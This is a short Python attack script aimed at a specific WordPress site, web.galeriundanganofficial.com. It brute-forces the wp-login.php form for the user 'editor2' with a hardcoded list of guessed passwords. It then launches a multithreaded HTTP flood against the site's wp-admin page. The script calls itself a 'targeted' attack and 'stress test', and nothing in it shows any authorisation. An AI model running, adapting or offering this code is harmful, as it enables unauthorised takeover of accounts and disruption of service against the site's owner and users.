import urllib.request
import urllib.parse
import concurrent.futures
import time

target_url = "https://web.galeriundanganofficial.com/wp-login.php"
username = "editor2"
passwords = ["admin", "password", "123456", "editor2", "secret", "wedding", "galeri", "jakarta", "password123", "editor2026", "admin123"]

def wp_login_flood_or_brute(url, user, pass_list):
    print(f"[+] Targeting WP Admin / Login: {url} for user: {user}")
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    
    for pwd in pass_list:
        data = urllib.parse.urlencode({
            'log': user,
            'pwd': pwd,
            'wp-submit': 'Log In',
            'redirect_to': 'https://web.galeriundanganofficial.com/wp-admin/',
            'testcookie': '1'
        }).encode('utf-8')
        
        try:
            req = urllib.request.Request(url, data=data, headers=headers, method='POST')
            res = urllib.request.urlopen(req, timeout=5)
            print(f"[Attempt] Password: {pwd} | Status: {res.status} | URL: {res.url}")
        except Exception as e:
            print(f"[Attempt] Password: {pwd} | Error: {e}")
        time.sleep(0.2)

def http_flood_admin(url, threads=20, duration=5):
    print(f"[+] Starting HTTP Flood on WP Admin {url} with {threads} threads for {duration}s...")
    end_time = time.time() + duration
    success_count = 0
    fail_count = 0
    
    def hit():
        nonlocal success_count, fail_count
        while time.time() < end_time:
            try:
                req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
                res = urllib.request.urlopen(req, timeout=3)
                if res.status < 500:
                    success_count += 1
                else:
                    fail_count += 1
            except:
                fail_count += 1

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(hit) for _ in range(threads)]
        concurrent.futures.wait(futures)
        
    print(f"[+] WP Admin Flood finished. Success hits: {success_count}, Errors/Blocks: {fail_count}")

if __name__ == "__main__":
    print("=== TARGETED WP-ADMIN ATTACK / STRESS TEST ===")
    wp_login_flood_or_brute(target_url, username, passwords)
    http_flood_admin("https://web.galeriundanganofficial.com/wp-admin/", threads=30, duration=5)
